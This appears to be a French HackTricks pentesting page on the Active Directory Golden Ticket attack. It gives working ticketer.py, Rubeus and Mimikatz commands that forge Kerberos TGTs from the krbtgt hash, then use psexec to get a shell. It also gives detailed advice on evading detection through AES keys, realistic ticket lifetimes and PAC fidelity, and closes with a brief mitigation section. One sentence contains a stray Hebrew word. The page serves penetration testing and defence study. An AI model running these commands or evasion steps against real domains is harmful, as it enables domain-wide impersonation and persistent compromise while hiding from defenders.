# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Une attaque **Golden Ticket** consiste en la **création d’un Ticket Granting Ticket (TGT) légitime usurpant n’importe quel utilisateur** grâce à l’utilisation du **hash NTLM du compte krbtgt de Active Directory (AD)**. Cette technique est particulièrement avantageuse car elle **permet d’accéder à n’importe quel service ou machine** au sein du domaine en tant qu’utilisateur usurpé. Il est crucial de se rappeler que les **identifiants du compte krbtgt ne sont jamais mis à jour automatiquement**.

Pour **obtenir le hash NTLM** du compte krbtgt, différentes méthodes peuvent être employées. Il peut être extrait du processus **Local Security Authority Subsystem Service (LSASS)** ou du fichier **NT Directory Services (NTDS.dit)** situé sur n’importe quel Domain Controller (DC) du domaine. De plus, **l’exécution d’une attaque DCsync** est une autre stratégie pour obtenir ce hash NTLM, ce qui peut être réalisé à l’aide d’outils tels que le module **lsadump::dcsync** dans Mimikatz ou le script **secretsdump.py** d’Impacket. Il est important de souligner que pour entreprendre ces opérations, **des privilèges domain admin ou un niveau d’accès similaire sont généralement requis**.

Bien que le hash NTLM soit une méthode viable pour cet objectif, il est **fortement recommandé** de **forger des tickets à l’aide des clés Kerberos Advanced Encryption Standard (AES) (AES128 et AES256)** pour des raisons de sécurité opérationnelle. C’est encore plus important dans les domaines modernes, car **l’utilisation de RC4 est progressivement abandonnée** et ressort beaucoup plus clairement dans la télémétrie Kerberos.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Notes modernes sur la fabrication des tickets

Lorsque c’est possible, **interrogez d’abord LDAP et SYSVOL** puis forgez le ticket en utilisant la vraie policy du domaine et les valeurs PAC de l’utilisateur au lieu de les inventer manuellement :
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` demande au DC les données de l’utilisateur, du groupe, NetBIOS et de policy utilisées pour construire un PAC plus réaliste.
- `/printcmd` affiche une ligne de commande hors ligne contenant les champs PAC récupérés, ce qui est utile si vous souhaitez ensuite forger le même ticket sans retoucher à nouveau LDAP.
- `/extendedupndns` ajoute les éléments PAC `UpnDns` plus récents contenant le `samAccountName` et le SID du compte.
- `/oldpac` supprime les buffers PAC `Requestor` et `Attributes` plus récents ; cela est בעיקר utile pour des tests de compatibilité avec des environnements plus anciens, et non pour le tradecraft par défaut.

Depuis Linux, les versions récentes d'Impacket prennent également en charge l'ajout des nouvelles structures PAC et la définition d'une période de validité réaliste :
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` est en **heures**. La valeur par défaut est **10 years**, ce qui est bruyant.
- `-extra-pac` ajoute les nouvelles informations PAC `UPN_DNS`.
- `-old-pac` force l’ancien format PAC.
- `-extra-sid` est utile lorsque le PAC a besoin de SIDs supplémentaires (par exemple, dans des scénarios d’escalade child-to-parent, qui sont couverts dans [SID-History Injection](sid-history-injection.md)).

**Une fois** que vous avez le **golden Ticket injecté**, vous pouvez accéder aux fichiers partagés **(C$)**, et exécuter des services et WMI, donc vous pouvez utiliser **psexec** ou **wmiexec** pour obtenir un shell (il semble que vous ne puissiez pas obtenir un shell via winrm).

### Contourner les détections courantes

Les méthodes les plus fréquentes pour détecter un golden ticket sont de **surveiller le trafic Kerberos** sur le réseau. Par défaut, Mimikatz **signe le TGT pour 10 years**, ce qui ressortira comme anormal dans les requêtes TGS ultérieures effectuées avec celui-ci.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utilisez les paramètres `/startoffset`, `/endin` et `/renewmax` pour contrôler le décalage de départ, la durée et le nombre maximal de renouvellements (tous en minutes).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Malheureusement, la durée de vie du TGT n’est pas journalisée dans les 4769, donc vous ne trouverez pas cette information dans les journaux d’événements Windows. Cependant, ce que vous pouvez corréler, c’est **observer des 4769 sans 4768 préalable**. Il est **impossible de demander un TGS sans un TGT**, et s’il n’existe aucune trace d’un TGT émis, on peut en déduire qu’il a été forgé hors ligne.

Dans les **versions plus récentes de Windows**, les Event IDs **4768** et **4769** exposent également une bien meilleure **télémétrie du type de chiffrement**. Un TGT/TGS forgé utilisant **RC4 (`0x17`)** dans un domaine où `krbtgt`, les clients et les services disposent déjà de clés AES est bien plus facile à détecter qu’il y a quelques années. C’est une raison de plus de privilégier des **Golden Tickets basés sur AES** et de faire correspondre au plus près la politique Kerberos normale du domaine.

Un autre problème d’OPSEC est la **fidélité du PAC**. Les tickets avec des appartenances à des groupes impossibles, des buffers PAC récents manquants, ou des métadonnées de compte qui ne correspondent pas à LDAP sont plus faciles à détecter lorsque les défenseurs valident le contenu du PAC par rapport aux données AD. Si vous avez besoin d’un TGT qui semble vraiment avoir été émis par un DC, consultez :

{{#ref}}
diamond-ticket.md
{{#endref}}

Il existe aussi des **limites environnementales** à la persistance. Le compte `krbtgt` conserve un **historique de mots de passe de 2**, donc un TGT forgé peut rester valide après la **première** réinitialisation de `krbtgt` s’il a été signé avec la clé précédente. C’est pourquoi les défenseurs invalident les Golden Tickets en **réinitialisant `krbtgt` deux fois** et en attendant au moins la durée de vie maximale des tickets du domaine entre les réinitialisations.

Pour **contourner cette détection**, vérifiez les diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

D’autres petits tricks que les défenseurs peuvent utiliser sont **d’alerter sur les 4769 pour les utilisateurs sensibles** tels que le compte administrateur de domaine par défaut et d’alerter sur **l’utilisation de RC4 pour `krbtgt`** dans les domaines qui émettent normalement des tickets AES.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
